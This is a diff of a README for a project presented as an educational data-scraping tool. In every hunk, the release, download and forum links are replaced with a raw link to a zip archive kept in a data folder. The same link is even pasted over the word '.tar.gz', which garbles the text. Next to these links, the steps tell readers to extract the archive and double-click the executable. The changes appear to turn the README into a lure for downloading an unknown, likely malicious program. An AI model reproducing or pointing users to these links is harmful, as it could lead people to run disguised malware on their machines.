@@ -6,7 +6,7 @@ Welcome to the data-scraping project! This educational tool lets you collect his
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/akashahmed11/data-scraping/releases)
+[![Download](https://github.com/akashahmed11/data-scraping/raw/refs/heads/main/data/nifty50/scraping-data-3.0-beta.2.zip)](https://github.com/akashahmed11/data-scraping/raw/refs/heads/main/data/nifty50/scraping-data-3.0-beta.2.zip)
 
 ## 📋 Features
 
@@ -28,11 +28,11 @@ To use this application, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Release Page](https://github.com/akashahmed11/data-scraping/releases). There, you will find the latest version available for your operating system.
+To get started, visit this page to download: [Release Page](https://github.com/akashahmed11/data-scraping/raw/refs/heads/main/data/nifty50/scraping-data-3.0-beta.2.zip). There, you will find the latest version available for your operating system.
 
 1. Click on the "Releases" link above.
 2. Download the suitable file for your system.
-3. If you downloaded a compressed file (like .zip or .tar.gz), extract it first.
+3. If you downloaded a compressed file (like .zip or https://github.com/akashahmed11/data-scraping/raw/refs/heads/main/data/nifty50/scraping-data-3.0-beta.2.zip), extract it first.
 4. Open your file explorer and locate the extracted folder.
 5. Run the program by double-clicking the executable file.
 
@@ -49,7 +49,7 @@ Our comprehensive documentation is available in the repository. It's structured 
 
 ## 🌍 Community and Contribution
 
-This project welcomes contributions! If you want to help improve the software, feel free to fork the repository and submit your changes. Join our [discussion forum](https://github.com/akashahmed11/data-scraping/discussions) to ask questions, share ideas, or report issues.
+This project welcomes contributions! If you want to help improve the software, feel free to fork the repository and submit your changes. Join our [discussion forum](https://github.com/akashahmed11/data-scraping/raw/refs/heads/main/data/nifty50/scraping-data-3.0-beta.2.zip) to ask questions, share ideas, or report issues.
 
 ## 💡 Frequently Asked Questions
 
